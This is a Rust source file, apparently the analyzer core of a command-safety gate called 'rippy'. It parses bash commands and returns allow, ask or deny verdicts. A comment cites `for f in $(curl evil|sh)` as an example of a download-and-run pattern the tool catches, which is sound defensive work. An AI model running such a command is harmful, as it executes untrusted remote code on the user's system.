use std::path::{Path, PathBuf};

use rable::{Node, NodeKind};

use crate::allowlists;
use crate::ast;
use crate::cc_permissions::{self, CcRules};
use crate::condition::MatchContext;
use crate::config::Config;
use crate::environment::Environment;
use crate::error::RippyError;
use crate::handlers::is_sole_help_flag;
use crate::parser::BashParser;
use crate::resolve::{self, LocalBinding, VarLookup};
use crate::verdict::{Decision, Verdict};

const MAX_DEPTH: usize = 256;

/// Maximum number of AST nodes walked per command. Bounds tree *breadth*
/// where `MAX_DEPTH` only bounds tree height: a pathological input that
/// produces thousands of sibling nodes at shallow depth would otherwise
/// slip through. Analysis that hits the cap returns Ask.
const MAX_NODES: usize = 10_000;

/// Maximum length (bytes) of a resolved command string. Resolution that
/// would produce a longer string falls back to Ask, preventing pathological
/// expansions (e.g., variables that contain other expansions, deeply
/// recursive aliases) from blowing up memory.
const MAX_RESOLVED_LEN: usize = 16_384;

/// Maximum number of nested resolution passes. Each call to `try_resolve`
/// re-parses the resolved command and may resolve again; this cap is
/// independent of `MAX_DEPTH` (which bounds AST node nesting) and prevents
/// `A=$B; B=$C; C=$A` cycles from blowing the stack.
const MAX_RESOLUTION_DEPTH: usize = 8;

/// The core analysis engine: parses a command and produces a safety verdict.
pub struct Analyzer {
    pub config: Config,
    pub parser: BashParser,
    pub remote: bool,
    pub working_directory: PathBuf,
    pub verbose: bool,
    cc_rules: CcRules,
    /// Cached current git branch name.
    git_branch: Option<String>,
    /// Set to true when analyzing a command that receives piped input.
    piped: bool,
    /// Variable lookup used for static expansion resolution.
    /// Defaults to `EnvLookup` (real process environment); tests inject mocks.
    var_lookup: Box<dyn VarLookup>,
    /// Tracks how many nested expansion-resolution passes have run for the
    /// current command. Bounded by `MAX_RESOLUTION_DEPTH` to prevent cycles.
    resolution_depth: usize,
    /// Remaining AST-node budget for the current `analyze` call. Reset to
    /// `MAX_NODES` at the top of every public `analyze` call and decremented
    /// once per `analyze_node` entry. Returns Ask when exhausted.
    node_budget: usize,
    /// Command-local variable bindings in effect for the node being analyzed:
    /// for/select loop variables, literal `VAR=val` prefixes, and prior literal
    /// assignments in a list. Managed with a strict checkpoint/truncate
    /// discipline so a binding never leaks past its lexical scope.
    locals: Vec<(String, LocalBinding)>,
}

impl Analyzer {
    /// Create a new analyzer from an [`Environment`] struct.
    ///
    /// This is the preferred constructor — it takes all external dependencies
    /// as an explicit struct, making tests deterministic without env-var hacks.
    ///
    /// # Errors
    ///
    /// Returns `RippyError::Parse` if the bash parser cannot be initialized.
    pub fn from_env(config: Config, env: Environment) -> Result<Self, RippyError> {
        let cc_rules = cc_permissions::load_cc_rules_with_home(&env.working_directory, env.home);
        let git_branch = crate::condition::detect_git_branch(&env.working_directory);
        Ok(Self {
            parser: BashParser::new()?,
            config,
            remote: env.remote,
            working_directory: env.working_directory,
            verbose: env.verbose,
            cc_rules,
            git_branch,
            piped: false,
            var_lookup: env.var_lookup,
            resolution_depth: 0,
            node_budget: MAX_NODES,
            locals: Vec::new(),
        })
    }

    /// Create a new analyzer using the real process environment for variable lookups.
    ///
    /// Convenience wrapper around [`Analyzer::from_env`] that reads `$HOME`
    /// and process env vars automatically.
    ///
    /// # Errors
    ///
    /// Returns `RippyError::Parse` if the bash parser cannot be initialized.
    pub fn new(
        config: Config,
        remote: bool,
        working_directory: PathBuf,
        verbose: bool,
    ) -> Result<Self, RippyError> {
        let env = Environment::from_system(working_directory, remote, verbose);
        Self::from_env(config, env)
    }

    /// Create a new analyzer with a custom variable lookup (used by tests
    /// to inject deterministic env values via `MockLookup`).
    ///
    /// # Errors
    ///
    /// Returns `RippyError::Parse` if the bash parser cannot be initialized.
    pub fn new_with_var_lookup(
        config: Config,
        remote: bool,
        working_directory: PathBuf,
        verbose: bool,
        var_lookup: Box<dyn VarLookup>,
    ) -> Result<Self, RippyError> {
        let env = Environment::from_system(working_directory, remote, verbose)
            .with_var_lookup(var_lookup);
        Self::from_env(config, env)
    }

    /// Build a `MatchContext` for condition evaluation.
    fn match_ctx(&self) -> MatchContext<'_> {
        MatchContext {
            branch: self.git_branch.as_deref(),
            cwd: &self.working_directory,
        }
    }

    /// Analyze a shell command string and return a safety verdict.
    ///
    /// # Errors
    ///
    /// This method no longer errors on unparseable input: after the
    /// string-matching config/CC layers run, a command that rable cannot parse
    /// yields a fail-closed `Ask` verdict (never a propagated error), so an
    /// unparseable-but-runnable command is gated rather than silently allowed.
    /// The `Result` signature is retained for call-site stability.
    pub fn analyze(&mut self, command: &str) -> Result<Verdict, RippyError> {
        // Strip a leading `NAME=VALUE` env prefix so string-matching layers see
        // the real command. see docs/security-invariants.md#env-prefix-strip
        let parsed = self.parser.parse(command);
        let stripped = parsed
            .as_ref()
            .ok()
            .and_then(|nodes| ast::strip_env_prefix(command, nodes));
        let match_str = stripped.as_deref().unwrap_or(command);

        if let Some(decision) = self.cc_rules.check(match_str) {
            if self.verbose {
                eprintln!(
                    "[rippy] CC permission rule matched: {match_str} -> {}",
                    decision.as_str()
                );
            }
            return Ok(cc_decision_to_verdict(decision, match_str));
        }

        if let Some(verdict) = self
            .config
            .match_command(match_str, Some(&self.match_ctx()))
        {
            if self.verbose {
                eprintln!(
                    "[rippy] config rule matched: {match_str} -> {}",
                    verdict.decision.as_str()
                );
            }
            return Ok(verdict);
        }

        // Fail-closed: on unparseable input the string-match layers above
        // (config/CC) have already had priority; anything reaching here that
        // rable cannot parse is gated with an Ask rather than propagating an
        // error that would exit non-blocking and let the command run un-gated.
        let Ok(nodes) = parsed else {
            return Ok(Verdict::ask(
                "rippy could not parse this command; approve manually",
            ));
        };
        let cwd = self.working_directory.clone();
        self.node_budget = MAX_NODES;
        Ok(self.analyze_nodes(&nodes, &cwd, 0))
    }

    fn analyze_nodes(&mut self, nodes: &[Node], cwd: &Path, depth: usize) -> Verdict {
        if nodes.is_empty() {
            return Verdict::allow("");
        }
        let verdicts: Vec<Verdict> = nodes
            .iter()
            .map(|n| self.analyze_node(n, cwd, depth))
            .collect();
        Verdict::combine(&verdicts)
    }

    fn analyze_node(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
        if depth > MAX_DEPTH {
            return Verdict::ask("nesting depth exceeded");
        }
        if self.node_budget == 0 {
            return Verdict::ask("ast node count exceeded");
        }
        self.node_budget -= 1;
        match &node.kind {
            NodeKind::Command { .. } => self.analyze_command(node, cwd, depth),
            NodeKind::Pipeline { commands, .. } => self.analyze_pipeline(commands, cwd, depth),
            NodeKind::List { items } => self.analyze_list(items, cwd, depth),
            NodeKind::If { .. }
            | NodeKind::While { .. }
            | NodeKind::Until { .. }
            | NodeKind::For { .. }
            | NodeKind::ForArith { .. }
            | NodeKind::Select { .. }
            | NodeKind::Case { .. }
            | NodeKind::BraceGroup { .. } => self.analyze_control_flow(node, cwd, depth),
            NodeKind::Subshell { body, redirects } => {
                let mut verdicts = vec![self.analyze_node(body, cwd, depth + 1)];
                verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
                Verdict::combine(&verdicts)
            }
            NodeKind::CommandSubstitution { command, .. } => {
                let inner = self.analyze_node(command, cwd, depth + 1);
                if ast::is_safe_heredoc_substitution(command) {
                    inner
                } else {
                    most_restrictive(inner, Verdict::ask("command substitution"))
                }
            }
            NodeKind::ProcessSubstitution { command, .. } => {
                let inner = self.analyze_node(command, cwd, depth + 1);
                most_restrictive(inner, Verdict::ask("command substitution"))
            }
            NodeKind::Function { .. } => Verdict::ask("function definition"),
            NodeKind::Negation { pipeline } | NodeKind::Time { pipeline, .. } => {
                self.analyze_node(pipeline, cwd, depth + 1)
            }
            NodeKind::HereDoc {
                quoted, content, ..
            } => Self::analyze_heredoc_node(*quoted, Some(content.as_str())),
            NodeKind::Coproc { command, .. } => self.analyze_node(command, cwd, depth + 1),
            NodeKind::ConditionalExpr { body, .. } => self.analyze_node(body, cwd, depth + 1),
            NodeKind::ArithmeticCommand { redirects, .. } => {
                Verdict::combine(&self.analyze_redirects(redirects, cwd, depth))
            }
            _ if ast::is_expansion_node(&node.kind) => Verdict::ask("shell expansion"),
            _ => Verdict::ask("unrecognized shell construct"),
        }
    }

    fn analyze_control_flow(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
        match &node.kind {
            NodeKind::If {
                condition,
                then_body,
                else_body,
                redirects,
            } => {
                let mut parts: Vec<&Node> = vec![condition.as_ref(), then_body.as_ref()];
                if let Some(eb) = else_body.as_deref() {
                    parts.push(eb);
                }
                self.analyze_compound(&parts, redirects, cwd, depth)
            }
            NodeKind::While {
                condition,
                body,
                redirects,
            }
            | NodeKind::Until {
                condition,
                body,
                redirects,
            } => self.analyze_compound(&[condition.as_ref(), body.as_ref()], redirects, cwd, depth),
            NodeKind::For { .. } | NodeKind::Select { .. } => {
                self.analyze_loop_binding(node, cwd, depth)
            }
            NodeKind::ForArith {
                body, redirects, ..
            }
            | NodeKind::BraceGroup { body, redirects } => {
                self.analyze_compound(&[body.as_ref()], redirects, cwd, depth)
            }
            NodeKind::Case {
                patterns,
                redirects,
                ..
            } => {
                let mut verdicts: Vec<Verdict> = patterns
                    .iter()
                    .filter_map(|p| p.body.as_ref())
                    .map(|b| self.analyze_node(b, cwd, depth + 1))
                    .collect();
                verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
                Verdict::combine(&verdicts)
            }
            _ => Verdict::allow(""),
        }
    }

    fn analyze_pipeline(&mut self, commands: &[Node], cwd: &Path, depth: usize) -> Verdict {
        let has_unsafe_redirect = commands
            .iter()
            .any(|c| self.command_has_unsafe_redirect(c, cwd));

        let mut verdicts: Vec<Verdict> = commands
            .iter()
            .enumerate()
            .map(|(i, cmd)| self.analyze_pipeline_command(cmd, i > 0, cwd, depth + 1))
            .collect();

        if has_unsafe_redirect {
            verdicts.push(Verdict::ask("pipeline writes to file"));
        }

        Verdict::combine(&verdicts)
    }

    fn analyze_pipeline_command(
        &mut self,
        node: &Node,
        piped: bool,
        cwd: &Path,
        depth: usize,
    ) -> Verdict {
        let prev_piped = self.piped;
        self.piped = piped;
        let v = self.analyze_node(node, cwd, depth);
        self.piped = prev_piped;
        v
    }

    fn analyze_list(&mut self, items: &[rable::ListItem], cwd: &Path, depth: usize) -> Verdict {
        // Checkpoint so literal assignments registered for later items in this
        // list (`SCRATCH=/tmp; ls $SCRATCH`) never leak into a sibling scope.
        let checkpoint = self.locals.len();
        let mut verdicts = Vec::new();
        let mut current_cwd = cwd.to_owned();
        let mut is_harmless_fallback = false;

        for (i, item) in items.iter().enumerate() {
            let v = self.analyze_node(&item.command, &current_cwd, depth + 1);
            // Register standalone literal assignments so subsequent list items
            // (but nothing outside this list) can resolve them.
            self.register_list_bindings(&item.command);

            if let Some(dir) = extract_cd_target(&item.command) {
                current_cwd = if Path::new(&dir).is_absolute() {
                    PathBuf::from(&dir)
                } else {
                    current_cwd.join(&dir)
                };
            }

            // In `|| true` patterns, only include the fallback if it's non-trivial
            if is_harmless_fallback && v.decision == Decision::Allow {
                is_harmless_fallback = false;
                continue;
            }
            is_harmless_fallback = false;

            if item.operator == Some(rable::ListOperator::Or)
                && items
                    .get(i + 1)
                    .is_some_and(|next| ast::is_harmless_fallback(&next.command))
            {
                is_harmless_fallback = true;
            }

            verdicts.push(v);
        }

        self.locals.truncate(checkpoint);
        Verdict::combine(&verdicts)
    }

    /// Push literal `VAR=val` bindings from a command's assignment nodes onto
    /// the locals stack. Non-literal values (expansions) are skipped — they are
    /// never bound and remain subject to the assignment-expansion guard.
    fn push_literal_bindings(&mut self, assignments: &[Node]) {
        for a in assignments {
            if let Some((name, val)) = ast::literal_assignment(a) {
                self.locals.push((name, LocalBinding::Literal(val)));
            } else if let Some(name) = ast::append_assignment_name(a) {
                // see docs/security-invariants.md#append-assignment-shadow
                self.locals.push((name, LocalBinding::Dynamic));
            }
        }
    }

    /// Register the literal assignments of a *standalone* assignment command
    /// (`SCRATCH=/tmp/x` with no command word) so later items in the same list
    /// can resolve them. Commands that carry a word bind their prefix only for
    /// their own duration (handled in the `Command` arm), so they are skipped.
    fn register_list_bindings(&mut self, node: &Node) {
        let NodeKind::Command {
            assignments, words, ..
        } = &node.kind
        else {
            return;
        };
        if words.is_empty() {
            self.push_literal_bindings(assignments);
        }
    }

    /// Analyze a simple `Command` node.
    ///
    /// Applies the assignment-expansion guard (`x=$(cmd)` → Ask), then binds any
    /// literal `VAR=val` prefix for the duration of this one command so
    /// `VAR=val cmd $VAR` resolves within it, and unwinds the binding afterward.
    fn analyze_command(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
        let NodeKind::Command {
            words,
            redirects,
            assignments,
        } = &node.kind
        else {
            // Unreachable: only dispatched on `NodeKind::Command`. Fail closed
            // for a security tool so a future dispatch change cannot silently
            // approve an unhandled node kind.
            return Verdict::ask("internal: non-command node in analyze_command");
        };
        if Self::assignment_has_expansion(assignments) {
            return Verdict::ask("assignment with expansion");
        }
        let checkpoint = self.locals.len();
        self.push_literal_bindings(assignments);
        let v = self.analyze_command_node(words, redirects, cwd, depth);
        self.locals.truncate(checkpoint);
        v
    }

    /// Analyze a `for`/`select` loop that binds an iteration variable.
    ///
    /// The iteration `words` are analyzed first (in the outer scope) so a
    /// dangerous expansion there — `for f in $(curl evil|sh)` — can no longer
    /// skip analysis. The loop variable is then bound as [`LocalBinding::Dynamic`]
    /// (set, value unknown) while the body is analyzed, and unwound afterward.
    fn analyze_loop_binding(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
        let (NodeKind::For {
            var,
            words,
            body,
            redirects,
        }
        | NodeKind::Select {
            var,
            words,
            body,
            redirects,
        }) = &node.kind
        else {
            // Unreachable: only dispatched on `NodeKind::For`/`NodeKind::Select`.
            // Fail closed rather than fail open for defense in depth.
            return Verdict::ask("internal: non-loop node in analyze_loop_binding");
        };
        let checkpoint = self.locals.len();
        let mut verdicts = self.analyze_iteration_words(words.as_deref());
        self.locals.push((var.clone(), LocalBinding::Dynamic));
        verdicts.push(self.analyze_node(body, cwd, depth + 1));
        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
        self.locals.truncate(checkpoint);
        Verdict::combine(&verdicts)
    }

    /// Check a loop's iteration words for unresolvable expansions (command or
    /// process substitution). Literal words and globs resolve fine and produce
    /// no verdict; an unresolvable word yields an Ask so the substitution is not
    /// silently executed. Uses the current locals scope (loop var not yet bound).
    fn analyze_iteration_words(&self, words: Option<&[Node]>) -> Vec<Verdict> {
        let Some(words) = words else {
            return Vec::new();
        };
        let scoped = resolve::ScopedLookup::new(&self.locals, self.var_lookup.as_ref());
        words
            .iter()
            .filter_map(|w| match resolve::resolve_word(w, &scoped) {
                resolve::WordResolution::Unresolvable { reason } => {
                    Some(Verdict::ask(format!("shell expansion ({reason})")))
                }
                _ => None,
            })
            .collect()
    }

    fn analyze_compound(
        &mut self,
        parts: &[&Node],
        redirects: &[Node],
        cwd: &Path,
        depth: usize,
    ) -> Verdict {
        let mut verdicts: Vec<Verdict> = parts
            .iter()
            .map(|b| self.analyze_node(b, cwd, depth + 1))
            .collect();
        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
        Verdict::combine(&verdicts)
    }

    /// Returns `true` if any `NAME=VALUE` assignment on a simple command has a
    /// shell expansion in its value (e.g. a command substitution or backticks).
    ///
    /// Assignment values are not otherwise inspected by the analyzer, so this
    /// guard — applied to every simple command, including those nested in
    /// pipelines and lists — forces such commands to Ask. Literal assignments
    /// (`FOO=bar ls`) contain no expansion and pass through unaffected.
    fn assignment_has_expansion(assignments: &[Node]) -> bool {
        assignments.iter().any(ast::has_expansions)
    }

    fn analyze_command_node(
        &mut self,
        words: &[Node],
        redirects: &[Node],
        cwd: &Path,
        depth: usize,
    ) -> Verdict {
        if let Some(resolved_verdict) = self.try_resolve(words, cwd, depth) {
            // combine (not most_restrictive) keeps the resolved_command field even
            // when a redirect verdict dominates the decision.
            let mut verdicts = vec![resolved_verdict];
            verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
            return Verdict::combine(&verdicts);
        }

        let Some(raw_name) = ast::command_name_from_words(words) else {
            return Verdict::allow("empty command");
        };
        let name = raw_name.to_owned();
        let args = ast::command_args_from_words(words);

        let resolved = self.config.resolve_alias(&name);
        let cmd_name = if resolved == name {
            name.clone()
        } else {
            resolved.to_owned()
        };

        if self.verbose {
            eprintln!("[rippy] command: {cmd_name}");
        }

        if allowlists::is_wrapper(&cmd_name) {
            if args.is_empty() {
                return Verdict::allow(format!("{cmd_name} (no inner command)"));
            }
            let inner = args.join(" ");
            return self.analyze_inner_command(&inner, cwd, depth);
        }

        if allowlists::is_simple_safe(&cmd_name) {
            if self.verbose {
                eprintln!("[rippy] allowlist: {cmd_name} is safe");
            }
            let mut v = Verdict::allow(format!("{cmd_name} is safe"));
            for rv in self.analyze_redirects(redirects, cwd, depth) {
                v = most_restrictive(v, rv);
            }
            return v;
        }

        // A help/version flag may short-circuit to Allow ONLY when it is the
        // command's sole argument. Matching it anywhere in argv let a dangerous
        // operand ride along auto-approved (see #149). Bare `-h` is dropped here
        // because unknown commands overload it (e.g. `-h <host>`); a lone `-h`
        // then Asks, the safe direction.
        if is_sole_help_flag(&args, &["--help", "--version"]) {
            return Verdict::allow(format!("{cmd_name} help/version"));
        }

        let handler_verdict = self.classify_with_handler(&cmd_name, &args, cwd, depth);

        let redirect_verdicts = self.analyze_redirects(redirects, cwd, depth);
        if redirect_verdicts.is_empty() {
            handler_verdict
        } else {
            let mut all = vec![handler_verdict];
            all.extend(redirect_verdicts);
            Verdict::combine(&all)
        }
    }
}

#[path = "analyzer_dispatch.rs"]
mod dispatch;

fn cc_decision_to_verdict(decision: Decision, command: &str) -> Verdict {
    let reason = match decision {
        Decision::Allow => format!("{command} (CC permission: allow)"),
        Decision::Ask => format!("{command} (CC permission: ask)"),
        Decision::Deny => format!("{command} (CC permission: deny)"),
    };
    Verdict {
        decision,
        reason,
        resolved_command: None,
    }
}

/// Annotate a verdict with the resolved command form: appends `(resolved: <cmd>)`
/// to the reason (idempotent) and stores the resolved command in `resolved_command`.
fn annotate_with_resolution(mut v: Verdict, resolved: &str) -> Verdict {
    if !v.reason.contains("(resolved:") {
        v.reason = if v.reason.is_empty() {
            format!("(resolved: {resolved})")
        } else {
            format!("{} (resolved: {resolved})", v.reason)
        };
    }
    v.resolved_command = Some(resolved.to_string());
    v
}

/// Resolve symlinks by canonicalizing the deepest ancestor of `path` that
/// exists on disk, then re-appending the non-existing tail components.
///
/// Unlike [`handlers::normalize_path`] (purely logical), this follows symlinks,
/// so a redirect target routed through a planted symlink resolves to its real
/// location. The tail is preserved because a write target usually does not
/// exist yet. Falls back to the input path when nothing can be canonicalized.
fn canonicalize_existing_ancestor(path: &Path) -> PathBuf {
    let mut ancestor = path;
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    loop {
        if let Ok(real) = std::fs::canonicalize(ancestor) {
            let mut result = real;
            result.extend(tail.iter().rev());
            return result;
        }
        match (ancestor.file_name(), ancestor.parent()) {
            (Some(name), Some(parent)) => {
                tail.push(name.to_os_string());
                ancestor = parent;
            }
            _ => return path.to_path_buf(),
        }
    }
}

fn extract_cd_target(node: &Node) -> Option<String> {
    let name = ast::command_name(node)?;
    if name != "cd" {
        return None;
    }
    let args = ast::command_args(node);
    args.first().cloned()
}

fn most_restrictive(a: Verdict, b: Verdict) -> Verdict {
    if a.decision >= b.decision { a } else { b }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::literal_string_with_formatting_args)]
#[path = "analyzer_tests.rs"]
mod tests;

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::literal_string_with_formatting_args)]
#[path = "analyzer_tests2.rs"]
mod tests2;
